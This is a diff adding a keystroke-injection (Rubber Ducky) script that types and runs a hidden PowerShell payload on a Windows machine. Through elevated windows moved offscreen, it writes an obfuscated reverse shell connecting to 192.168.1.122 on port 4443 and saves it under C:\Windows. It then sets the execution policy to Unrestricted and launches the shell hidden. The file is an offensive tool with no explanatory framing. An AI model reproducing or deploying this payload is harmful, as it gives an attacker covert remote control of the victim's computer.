@@ -1,0 +1,54 @@
+DELAY 750  
+GUI r 
+DELAY 1000
+STRING powershell Start-Process notepad -Verb runAs
+ENTER
+DELAY 750  
+ALT y 
+DELAY 750  
+ENTER
+ALT SPACE 
+DELAY 1000
+STRING m 
+DELAY 1000
+DOWNARROW
+REPEAT 100
+ENTER
+STRING Add-Content "Start-Process $PSHOME\powershell.exe -ArgumentList {$4a4148522a694147bcce90997fb06df4 = New-Object System.Net.Sockets.TCPClient('192.168.1.122',4443);$19f543240a82424a96749c25b23c8cd0 = $4a4148522a694147bcce90997fb06df4.GetStream();[byte[]]$d547ebc161434f699b9ad6e84b317981 = 0..65535|%{0};while(($i = $19f543240a82424a96749c25b23c8cd0.Read($d547ebc161434f699b9ad6e84b317981, 0, $d547ebc161434f699b9ad6e84b317981.Length)) -ne 0){;$df92b74a3b244c3abbd8bb0ac5c1f881 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($d547ebc161434f699b9ad6e84b317981,0, $i);$8c114f0355af4b2b971ad80bf328b334 = (i''e''x $df92b74a3b244c3abbd8bb0ac5c1f881 2>&1 | Out-String );$8c114f0355af4b2b971ad80bf328b3342 = $8c114f0355af4b2b971ad80bf328b334 + 'P''S ' + (p''w''d).Path + '> ';$dd867e14389346deba72505224959626 = ([text.encoding]::ASCII).GetBytes($8c114f0355af4b2b971ad80bf328b3342);$19f543240a82424a96749c25b23c8cd0.Write($dd867e14389346deba72505224959626,0,$dd867e14389346deba72505224959626.Length);$19f543240a82424a96749c25b23c8cd0.Flush()};$4a4148522a694147bcce90997fb06df4.Close()} -WindowStyle Hidden"
+ENTER
+STRING start-Process powershell.exe -windowstyle hidden "$env:TEMP\95598.ps1"
+ENTER
+
+
+
+
+STRING Remove-Item $MyINvocation.InvocationName 
+ENTER
+CTRL s
+DELAY 1000
+STRING C:\Windows\config-95598.ps1
+ENTER
+DELAY 1000
+ALT F4 
+DELAY 750  
+GUI r 
+DELAY 750  
+STRING powershell Start-Process cmd -Verb runAs 
+ENTER
+DELAY 750  
+ALT y 
+DELAY 1000
+STRING mode con:cols=14 lines=1 
+ENTER
+ALT SPACE 
+DELAY 750  
+STRING m 
+DELAY 750   
+DOWNARROW 
+REPEAT 100
+ENTER
+STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false
+ENTER
+DELAY 750
+STRING powershell.exe -windowstyle hidden -File C:\Windows\config-95598.ps1
+ENTER
